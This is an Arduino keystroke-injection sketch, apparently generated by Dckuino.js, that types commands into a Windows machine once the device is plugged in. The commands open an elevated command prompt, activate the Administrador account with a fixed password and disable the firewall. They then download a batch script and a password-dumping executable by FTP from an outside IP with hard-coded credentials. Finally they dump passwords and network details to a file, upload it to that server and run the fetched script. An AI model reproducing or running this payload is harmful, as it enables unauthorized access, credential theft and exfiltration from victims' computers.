#define kbd_es_es
#include <Keyboard.h>

/*
 * Generated with <3 by Dckuino.js, an open source project !
 */



void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(700);

  typeKey(KEY_LEFT_GUI);
  delay(1600);
  Keyboard.print("cmd");
  delay(1600);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4200);
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);
  delay(850);
  
  Keyboard.print("cd \\");
  typeKey(KEY_RETURN);
  Keyboard.print("net user Administrador /active:yes & net user Administrador 123Sistemas2017");
  typeKey(KEY_RETURN);
  Keyboard.print("mkdir TEMP");
  typeKey(KEY_RETURN);
  Keyboard.print("cd TEMP");
  typeKey(KEY_RETURN);
  Keyboard.print("netsh advfirewall set allprofiles state off");
  typeKey(KEY_RETURN);
  Keyboard.print("ftp 177.241.71.31");
  typeKey(KEY_RETURN);
  Keyboard.print("root");
  typeKey(KEY_RETURN);
  Keyboard.print("123Sistemas2017&");
  typeKey(KEY_RETURN);
  Keyboard.print("cd USR");
  typeKey(KEY_RETURN);
  Keyboard.print("get script.bat");
  typeKey(KEY_RETURN);
  Keyboard.print("get pass.exe");
  typeKey(KEY_RETURN);
  Keyboard.print("quit");
  typeKey(KEY_RETURN);
  
  Keyboard.print("pass -f %computername%_%date:~0,2%%date:~3,2%%date:~8,2%.txt");
  typeKey(KEY_RETURN);
  Keyboard.print("ipconfig /all >> %computername%_%date:~0,2%%date:~3,2%%date:~8,2%.txt");
  typeKey(KEY_RETURN);
  
  Keyboard.print("ftp 177.241.71.31");
  typeKey(KEY_RETURN);
  Keyboard.print("root");
  typeKey(KEY_RETURN);
  Keyboard.print("123Sistemas2017&");
  typeKey(KEY_RETURN);
  Keyboard.print("cd USR");
  typeKey(KEY_RETURN);
  Keyboard.print("send *.txt");
  typeKey(KEY_RETURN);
  Keyboard.print("quit");
  typeKey(KEY_RETURN);

  Keyboard.print("script.bat");
  typeKey(KEY_RETURN);
  

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
